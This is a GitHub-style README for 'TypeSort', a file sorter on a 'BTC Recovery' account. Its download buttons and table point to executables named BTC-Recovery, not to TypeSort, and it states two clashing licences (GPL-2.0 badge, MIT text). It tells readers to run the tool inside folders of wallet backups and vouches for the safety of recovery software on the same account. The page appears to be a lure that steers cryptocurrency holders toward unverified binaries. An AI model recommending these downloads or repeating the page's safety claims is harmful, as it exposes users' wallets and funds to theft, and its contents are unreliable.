<div align="center">
<img src="assets/banner-article.png" alt="TypeSort">
</div>

<h1 align="center">TypeSort</h1>

<p align="center">A small file-sorting utility kept alongside the recovery work.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

One utility, kept where the recovery material is kept.

> Only download from this GitHub release page.

## What this repository is for

TypeSort is a small utility that sorts the files in its own folder by type, and it lives on this account because recovery work produces exactly the kind of folder it is for: wallet backups, exports, screenshots of addresses and a dozen text files with similar names. It is not part of the recovery application and it never touches a wallet. It is here so that the material you collect while working through a guide stays findable, which matters more than it sounds when a search runs for hours and you are comparing addresses between four open windows. The rest of the account is the product: an application repository with the release and three guide repositories grouped by situation. It is deliberately small: one behaviour, one readme, and no settings to misconfigure before a long run that you would rather not interrupt.

## Who it is for

- You have a folder of wallet backups and exports with unhelpful names.
- You are working through a long recovery and keep losing the file you need.
- You want a utility that does one thing and touches nothing else.

## Start here

- The seed-phrase guides explain what to collect before a run.
- The wallet-file guides explain how to keep a backup copy safe.
- The safety guide covers what should never sit in a folder at all.

## How to use these guides

1. Keep the utility in the folder it is meant to sort, as its own readme describes.
2. Sort before you start a recovery, so the files you need are not buried.
3. Keep any phrase or password out of the folder entirely; sorting does not make storage safe.

## The guides, grouped

Four guides are the reason the folder gets sorted.

| Guide | What it answers |
| --- | --- |
| [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) | A seed phrase can be recovered when part of it still exists. |
| [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) | A `wallet.dat` file is Bitcoin Core's wallet, encrypted with a password you chose at some point; it cannot be reset, but it can be searched. |
| [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) | BTCRecover is free, open-source software that runs offline and needs nothing sent anywhere, which makes it safe in the way that matters for a recovery tool. |
| [Wallet recovery FAQ](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-wallet-recovery-faq.md) | The questions that come up before anything else: what can be recovered, what cannot, which artifact decides it, and where each route starts. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| A recovery that needs a plan | The seed phrase guides | A search small enough to run, checked against one address. |
| A wallet file with no password | The wallet file guides | Candidates tested against a copy of the file, offline. |
| A download you want to check | The tool guides | The published checksum and the file that matches it. |

## Common first questions

### Does it touch wallet files?

It sorts files by type and does not open or modify their contents.

### Is it part of BTC Recovery?

No. It is a separate utility under its own MIT licence, kept here for convenience.

### Why is it on this account at all?

Because a long recovery produces a folder of backups, exports and notes, and finding the right file again is part of the job.

## Before you install

Install the recovery release from the application repository for the actual work; this utility is not part of it. Keep any phrase, password or wallet file out of a folder you are sorting, because a tidy folder is not a safe one. The safety guide covers what should never sit next to your recovery material in the first place.

## About

TypeSort is a single-purpose utility kept beside the recovery project rather than inside it. It sorts files by type in the folder it lives in and does nothing else, which is the whole reason it is useful when four windows are open and every file is called a variation of the same name. It is listed here rather than hidden because the account is small and a reader who is deep in a recovery should be able to see everything that is being offered. Sorting is not recovery, and this page never suggests otherwise: it is the small housekeeping step before a long night of searching.

## License

TypeSort is released under the MIT licence, and the terms are set out in full in [LICENSE](LICENSE).

---

**TypeSort** - one page of the BTC Recovery account.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
